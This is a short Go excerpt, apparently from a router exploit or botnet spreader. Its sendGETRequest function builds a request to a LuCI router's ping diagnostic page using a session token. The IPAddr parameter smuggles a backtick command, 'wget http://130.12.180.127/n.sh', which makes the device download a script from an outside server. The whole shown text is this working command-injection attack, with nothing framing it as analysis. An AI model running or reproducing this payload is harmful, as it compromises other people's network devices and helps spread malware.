...
func sendGETRequest(ipPortString, sysauthValue, stokValue string) {
    ...
    getRequestURL := fmt.Sprintf("https://%s/cgi-bin/luci/;stok=%s/admin/system/diagnosis_ping?IPAddr=1.1.1.1&Size=64`wget+http://130.12.180.127/n.sh`&Timeout=10&interface=default&Count=4&_=0.4044032183131234", ipPortString, stokValue)
